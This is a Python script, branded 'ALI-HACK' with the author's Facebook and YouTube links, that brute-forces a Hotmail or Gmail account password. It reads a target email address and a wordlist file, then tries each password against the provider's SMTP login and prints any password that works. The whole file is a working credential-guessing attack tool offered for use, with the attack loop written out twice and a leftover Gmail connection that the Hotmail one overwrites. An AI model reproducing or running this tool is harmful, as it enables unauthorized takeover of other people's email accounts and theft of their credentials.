
import smtplib
import os
os.system("color 0E")
smtpserver = smtplib.SMTP('smtp.gmail.com' , 587)
smtpserver.ehlo()
smtpserver.starttls()

import smtplib

smtpserver = smtplib.SMTP('smtp.live.com' , 587)
smtpserver.ehlo()
smtpserver.starttls()
print("===============================")
print("\033[33m   ___    ___     ")
print("  ( _<    >_ )    ")
print("  //        \\\   ")
print("  \\\___..___// ")
print("   `-(    )-'    ")    
print("     _|__|_ ")
print("    /_|__|_\ ")
print("    /_|__|_\ ")
print("    /_\__/_\ ")
print("     \ || /  _)  ")    
print("       ||   ( )  ")    
print("       \\\___// ")
print("        `---' ")
print("\033[31mALI-HACK :\033[37m Hotmail Hack Account")
print("Facebook:www.facebook.com/Ali20Hack")
print("Youtube:https://www.youtube.com/channel/UCkOu7kHM1aJkJw87d2FlG9Q")
print("===============================")
user =input('Enter The Email===>')
paso =input('Enter The Eass====>')
paso = open(paso,"r")
print('START BRUTE :==|+[HACKER]+|==>:')
print('\a*-*-*-*-*-*-*-*-*-*-*')
print(user)
print('*-*-*-*-*-*-*-*-*-*-*')
for password in paso :
 try:
  smtpserver.login(user,password);
  print("\033[32m[-OK-] \033[37m|Password found====> ",password)
  print( "Email: {0}".format(user)+"\n\r")
  print ("Password is: {0}".format(password)+"\n\r\n\r\n\r")
  break;
 except smtplib.SMTPAuthenticationError:
  print ("\033[31m[!-NO-!]\033[37m Faild Passowrd====>", password)
user =input('Enter The Email===>')
paso =input('Enter The Eass====>')
paso = open(paso,"r")
print('START BRUTE :==|+[HACKER]+|==>:')
print('\a*-*-*-*-*-*-*-*-*-*-*')
print(user)
print('*-*-*-*-*-*-*-*-*-*-*')
for password in paso :
 try:
  smtpserver.login(user,password);
  print("[-OK-] |Password found====> ",password)
  print( "Email: {0}".format(user)+"\n\r")
  print ("Password is: {0}".format(password)+"\n\r\n\r\n\r")
  break;
 except smtplib.SMTPAuthenticationError:
  print ("[!-NO-!] Faild Passowrd====>", password)
